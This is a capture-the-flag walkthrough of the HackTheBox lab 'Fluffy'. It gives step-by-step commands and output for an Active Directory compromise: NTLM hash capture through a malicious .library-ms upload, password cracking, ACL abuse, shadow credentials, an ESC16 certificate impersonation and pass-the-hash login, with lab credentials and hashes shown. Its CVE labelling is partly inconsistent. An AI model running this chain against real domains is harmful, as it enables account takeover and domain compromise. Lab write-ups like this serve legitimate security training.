---
title: Fluffy
categories: [HackTheBox]
tags: [windows, ldap, kerberos, smb, nmap, passwordcracking, adcs, shadow-credentials, esc16]
media_subpath: /images/hackthebox_fluffy/
image:
  path: 'https://labs.hackthebox.com/storage/avatars/ef8fc92ac7cccd8afa4412241432f064.png'
---

# HackTheBox Fluffy - Complete Walkthrough

## Overview

Fluffy is a Medium Windows machine that demonstrates advanced Active Directory attack techniques including CVE exploitation, shadow credentials attacks, and ADCS (Active Directory Certificate Services) abuse. The machine showcases real-world Windows penetration testing scenarios starting with initial credentials.

**Difficulty:** Medium  
**OS:** Windows  
**Key Techniques:** CVE exploitation, Shadow credentials, ADCS abuse, ESC16 attack, Certificate-based authentication

### Attacks Used in This Box

This machine demonstrates several critical Active Directory attack techniques:

- **Active Directory Enumeration** - BloodHound analysis and LDAP enumeration 
- **Password Cracking** - Hash cracking with John the Ripper
- **Active Directory ACL Abuse** - Exploiting GenericAll permissions ([Theory](/theory/windows/AD/acl/))
- **Shadow Credentials Attack** - Adding key credentials to service accounts ([Theory](/theory/windows/AD/shadow-credentials/))
- **ESC16 Attack** - Exploiting vulnerable certificate templates ([Theory](/theory/windows/AD/adcs/))

---

## Initial Access

### Provided Credentials

As mentioned in the machine description, this box simulates a real-world Windows penetration test scenario where you start with initial credentials:

**Initial Credentials:**
- **Username:** `j.fleischman`
- **Password:** `J0elTHEM4n1990!`
- **Domain:** `fluffy.htb`

> **Info Status:** As is common in real life Windows pentests, you will start the Fluffy box with credentials for the following account: j.fleischman / J0elTHEM4n1990!
{: .prompt-info}

### BloodHound Enumeration

Let's start by performing comprehensive Active Directory enumeration using BloodHound to understand the domain structure and potential attack paths:

```bash
bloodhound-ce-python -ns $IP -u $USERAD -p $PASS -c All --zip -d $DOMAIN
```

**Command Explanation:**
- `-ns`: Nameserver IP for DNS resolution
- `-u`: Username for authentication
- `-p`: Password for authentication
- `-c All`: Collect all available data
- `--zip`: Compress the output
- `-d`: Domain name

This command will collect comprehensive Active Directory data including users, groups, computers, and their relationships.

---

## User and Group Enumeration

### Remote Management Users

Let's enumerate users who have remote management privileges, as these are often high-value targets:

```bash
nxc ldap fluffy.htb -u j.fleischman -p 'J0elTHEM4n1990!' --groups 'Remote Management Users'
```

![Getting Remote Users From NXC](file-20250806142758528.png)

**Key Finding:** The `winrm_svc` user is a member of the Remote Management Users group, indicating it has WinRM privileges and could be a potential target for lateral movement.

### SMB Share Enumeration

Let's enumerate SMB shares to identify accessible resources:

```bash
nxc smb fluffy.htb -u j.fleischman -p 'J0elTHEM4n1990!' --shares
```

![Listing Shares](file-20250806142927112.png)

**Key Finding:** We have read/write access to the `IT` share, which could contain sensitive information or allow us to upload malicious files.


### SMB Share Access

Let's access the IT share to explore its contents:

```bash
smbclient.py fluffy.htb/j.fleischman:'J0elTHEM4n1990!'@10.129.14.248
```

Once connected:
```bash
use IT
ls
get upgrade_notice.pdf
```

![Using smbclient to access shares](file-20250806143042341.png)

**Key Finding:** We discover an `upgrade_notice.pdf` file that contains information about recent vulnerabilities with CVE IDs and severity levels.

---

## Vulnerability Analysis

### CVE-2025-24996 Discovery

Examining the downloaded PDF file, we find information about CVE-2025-24996:

![Upgrade_Notice.pdf](file-20250806143102466.png)

**CVE Details:**
- **CVE ID:** CVE-2025-24996
- **Description:** "External control of file name or path in Windows NTLM allows an unauthorized attacker to perform spoofing over a network"
- **Severity:** Critical

![CVE-2025-24996](file-20250806143133446.png)

> **Note:** looking around at the 2025-24996 cve we found a "External control of file name or path in windows NTLM allows an unauthorized attacker to perform spoofing over a network"
{: .prompt-info}

### CVE-2025-24996 Exploitation

Researching this CVE, we find a proof-of-concept exploit:

**Exploit Reference:** https://github.com/helidem/CVE-2025-24054_CVE-2025-24071-PoC

The exploit involves uploading a malicious `.library-ms` file that triggers an NTLM authentication request when accessed.

**Exploitation Steps:**
1. Create the malicious `xd.library-ms` file
2. Upload it to the IT share
3. Set up a responder to capture NTLM hashes
4. Trigger the file access to capture authentication

![PoC](file-20250806144125498.png)

**Result:** We successfully capture an NTLM hash for user `p.agila`.

### Hash Cracking

Using John the Ripper to crack the captured NTLM hash:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

![Password Crack](file-20250806144943989.png)

**Cracked Credentials:** `p.agila:prometheusx-303`

---

## Privilege Escalation

### LDAP Enumeration with New Credentials

Now that we have credentials for `p.agila`, let's enumerate what permissions this user has:

```bash
bloodyAD -d fluffy.htb --host 10.129.14.248 -u p.agila -p prometheusx-303 get writable
```

![bloodyAD get writable](file-20250806145813884.png)

**Key Finding:** User `p.agila` has `GenericAll` permissions over service accounts, which is a significant privilege escalation opportunity.

### Group Membership Manipulation

We can add ourselves to the Service Accounts group to gain additional privileges:

```bash
bloodyAD -d fluffy.htb --host 10.129.14.248 -u p.agila -p prometheusx-303 add groupMember 'Service Accounts' p.agila
```

Let's verify our new permissions:

```bash
bloodyAD -d fluffy.htb --host 10.129.14.248 -u p.agila -p prometheusx-303 get writable
```

![bloodyAD two](file-20250806145920964.png)

**Key Finding:** We now have `GenericWrite` permissions over service accounts, giving us access to `ldap_svc` and `ca_svc` accounts.


### BloodHound Attack Path Analysis

Using BloodHound, we can visualize the attack path from our current position to domain admin:

![BloodHound path](file-20250806150906666.png)

This shows us the potential path through service accounts to achieve domain admin privileges.

---

## Shadow Credentials Attack

### Shadow Credentials on winrm_svc

We can use the shadow credentials attack to add key credentials to the `winrm_svc` account:

```bash
bloodyAD -d fluffy.htb --host 10.129.14.248 -u p.agila -p prometheusx-303 add shadowCredentials winrm_svc
```

**Results:**
```bash
[+] KeyCredential generated with following sha256 of RSA key: 9bb6b3bf7c64848f6b08f363bfe92c93bbdb8939b5fab6ad89d88471de0757af
[+] TGT stored in ccache file winrm_svc_3I.ccache

NT: 33bd09dcd697600edf6b3a7af4875767
```

**Command Explanation:**
- `add shadowCredentials`: Adds a key credential to the target account
- `winrm_svc`: The target service account
- The tool generates an RSA key pair and stores the TGT in a ccache file

> **Note:** We then use the shadow credentials attack to get the hash for those two users
{: .prompt-info}

---

## ADCS Enumeration and Exploitation

### Certificate Authority Enumeration

Let's enumerate the Active Directory Certificate Services to identify potential vulnerabilities:

```bash
export KRB5CCNAME=winrm_svc_3I.ccache
certipy find -target $FQDN -k -enabled -hide-admins -oids -stdout
```
  
> **Command Explanation:**
- `find`: Enumerate certificate authorities and templates
- `-target`: Target domain
- `-k`: Use Kerberos authentication
- `-enabled`: Only show enabled templates
- `-hide-admins`: Hide admin templates
- `-oids`: Show OIDs
- `-stdout`: Output to stdout
{: .prompt-info}

**Results:**
```bash
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Finding issuance policies
[*] Found 14 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'fluffy-DC01-CA' via RPC
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'fluffy-DC01-CA'
[*] Checking web enrollment for CA 'fluffy-DC01-CA' @ 'DC01.fluffy.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : fluffy-DC01-CA
    DNS Name                            : DC01.fluffy.htb
    Certificate Subject                 : CN=fluffy-DC01-CA, DC=fluffy, DC=htb
    Certificate Serial Number           : 3670C4A715B864BB497F7CD72119B6F5
    Certificate Validity Start          : 2025-04-17 16:00:16+00:00
    Certificate Validity End            : 3024-04-17 16:11:16+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Disabled Extensions                 : 1.3.6.1.4.1.311.25.2
    Permissions
      Access Rights
        Enroll                          : FLUFFY.HTB\Cert Publishers
    [!] Vulnerabilities
      ESC16                             : Security Extension is disabled.
    [*] Remarks
      ESC16                             : Other prerequisites may be required for this to be exploitable. See the wiki for more details.
Certificate Templates
  0
    Template Name                       : KerberosAuthentication
```

**Key Findings:**
- Certificate Authority: `fluffy-DC01-CA`
- ESC16 vulnerability detected: Security Extension is disabled
- Cert Publishers group can enroll certificates

### ESC16 Vulnerability Analysis

The ESC16 vulnerability indicates that the Security Extension is disabled on the certificate authority, which can be exploited under certain conditions:

![ESC16](file-20250806151954104.png)

**ESC16 Details:**
- **Vulnerability:** Security Extension is disabled
- **Impact:** Allows certificate template manipulation
- **Prerequisites:** Cert Publishers group membership


> **Note:** Cert publishers can enroll at the ca -> `ca_svc` the victim for the attack
{: .prompt-info}

---

## ESC16 Attack Execution

### Certificate Service Account Analysis

Let's examine the `ca_svc` account details:

```bash
certipy account -k -dc-ip $IP -target $FQDN -user 'ca_svc' read
```

**Results:**
```bash
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Reading attributes for 'ca_svc':
    cn                                  : certificate authority service
    distinguishedName                   : CN=certificate authority service,CN=Users,DC=fluffy,DC=htb
    name                                : certificate authority service
    objectSid                           : S-1-5-21-497550768-2797716248-2627064577-1103
    sAMAccountName                      : ca_svc
    servicePrincipalName                : ADCS/ca.fluffy.htb
    userPrincipalName                   : ca_svc@fluffy.htb
    userAccountControl                  : 66048
    whenCreated                         : 2025-04-17T16:07:50+00:00
    whenChanged                         : 2025-09-17T21:22:53+00:00
```

### UPN Manipulation for ESC16

The ESC16 attack involves manipulating the User Principal Name (UPN) of the certificate service account to impersonate the administrator:

```bash
certipy account -k -dc-ip $IP -target $FQDN -user 'ca_svc' -upn 'administrator' update
```

**Results:**
```bash
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Updating user 'ca_svc':
    userPrincipalName                   : administrator
[*] Successfully updated 'ca_svc'
```

> **Command Explanation:**
- `account`: Manage user accounts
- `-k`: Use Kerberos authentication
- `-dc-ip`: Domain controller IP
- `-target`: Target machine
- `-user`: Target user account
- `-upn`: New User Principal Name
- `update`: Update the account
{: .prompt-info}

### Shadow Credentials on ca_svc

First, let's add shadow credentials to the `ca_svc` account:

```bash
bloodyAD -d fluffy.htb --host 10.129.14.248 -u p.agila -p prometheusx-303 add shadowCredentials ca_svc
```

**Results:**
```bash
[+] KeyCredential generated with following sha256 of RSA key: 54ed481b5c2354a8ae2b25b5b1b63940793a611ee3e62c1a5ed3fc17f2bdc4e7
[+] TGT stored in ccache file ca_svc_q7.ccache

NT: ca0f4f9e9eb8a092addf53bb03fc98c8
```

### Certificate Request with Administrator UPN

Now we can request a certificate using the modified UPN:

```bash
export KRB5CCNAME=ca_svc_q7.ccache
certipy req -k -dc-ip $IP -target $FQDN -ca 'fluffy-DC01-CA' -template 'User'
```

**Results:**
```bash
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[!] DC host (-dc-host) not specified and Kerberos authentication is used. This might fail
[*] Requesting certificate via RPC
[*] Request ID is 16
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```

> **Command Explanation:**
- `export KRB5CCNAME`: Set the Kerberos credential cache
- `req`: Request a certificate
- `-ca`: Certificate authority name
- `-template`: Certificate template to use
{: .prompt-info}

### Restore Original UPN

Let's restore the original UPN: 

```bash
certipy account -k -dc-ip $IP -target $FQDN -user 'ca_svc' -upn 'ca_svc@fluffy.htb' update
```

**Results:**
```bash
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Updating user 'ca_svc':
    userPrincipalName                   : ca_svc@fluffy.htb
[*] Successfully updated 'ca_svc'
```

### Certificate-based Authentication

Now we can use the certificate to authenticate as the administrator:

```bash
certipy auth -pfx administrator.pfx -dc-ip $IP -domain $DOMAIN
```

**Results:**
```bash
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator'
[*] Using principal: 'administrator@fluffy.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
File 'administrator.ccache' already exists. Overwrite? (y/n - saying no will save with a unique filename): y
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@fluffy.htb': aad3b435b51404eeaad3b435b51404ee:8da83a3fa618b6e3a00e93f676c92a6e
```

> **Command Explanation:**
- `auth`: Authenticate using certificate
- `-pfx`: Certificate file
- `-dc-ip`: Domain controller IP
- `-domain`: Domain name
{: .prompt-info}

**Key Results:**
- Successfully obtained TGT for administrator
- Retrieved NT hash: `8da83a3fa618b6e3a00e93f676c92a6e`

---

## Domain Admin Access

### Final Authentication

We can now use the administrator credentials to access the domain controller:

```bash
evil-winrm -i 10.129.14.248 -u administrator -H 8da83a3fa618b6e3a00e93f676c92a6e
```

![Domain Admin Login](file-20250806153126819.png)

> **Command Explanation:**
- `evil-winrm`: WinRM client for remote access
- `-i`: Target IP address
- `-u`: Username
- `-H`: NT hash for pass-the-hash authentication
{: .prompt-info}


---

## Understanding the Attack Chain

This attack demonstrates several sophisticated Active Directory attack techniques:

1. **Initial Access:** Starting with provided credentials (realistic scenario)
2. **Information Gathering:** BloodHound enumeration and SMB share analysis
3. **CVE Exploitation:** CVE-2025-24996 for NTLM hash capture
4. **Password Cracking:** John the Ripper for hash cracking
5. **Privilege Escalation:** ACL abuse and group membership manipulation
6. **Shadow Credentials:** Adding key credentials to service accounts
7. **ADCS Exploitation:** ESC16 attack for certificate-based impersonation
8. **Domain Compromise:** Certificate-based authentication as administrator

### Key Concepts

- **CVE-2025-24996:** NTLM relay vulnerability in Windows
- **Shadow Credentials:** Adding key credentials to AD accounts
- **ESC16:** ADCS vulnerability allowing certificate template manipulation
- **Certificate-based Authentication:** Using certificates for domain access
- **ACL Abuse:** Exploiting GenericAll and GenericWrite permissions

---

## Conclusion

The Fluffy machine demonstrates several critical Active Directory security concepts:

1. **CVE Management:** The importance of keeping Windows systems updated
2. **Shadow Credentials:** Advanced persistence techniques in Active Directory
3. **ADCS Security:** Proper configuration of certificate services
4. **ACL Management:** Careful management of access control lists
5. **Certificate Security:** Proper certificate template configuration

**Key Takeaways:**
- Always keep Windows systems updated to prevent CVE exploitation
- Implement proper ACL management and regular auditing
- Secure ADCS configurations and monitor certificate templates
- Monitor for shadow credentials and unusual certificate requests
